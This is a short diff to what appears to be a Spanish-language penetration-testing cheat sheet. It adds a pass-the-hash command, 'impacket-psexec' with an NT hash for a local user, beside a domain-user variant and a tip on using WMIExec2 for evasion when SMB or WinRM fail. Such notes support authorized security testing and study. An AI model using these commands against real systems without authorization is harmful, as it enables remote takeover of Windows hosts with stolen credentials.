@@ -501,6 +501,7 @@ NOTA:
 	- Si no funciona por ``SMB o WinRM`` utilizar ``WMIExec2`` para la evasión y conexión mediante WMI
 
 ```bash
+❯ impacket-psexec user@<IP> -hashes :NThash   # usuario local
 ❯ impacket-psexec domain/user@<IP> -hashes :NThash
 # Especificar puerto cuando el default falla
 
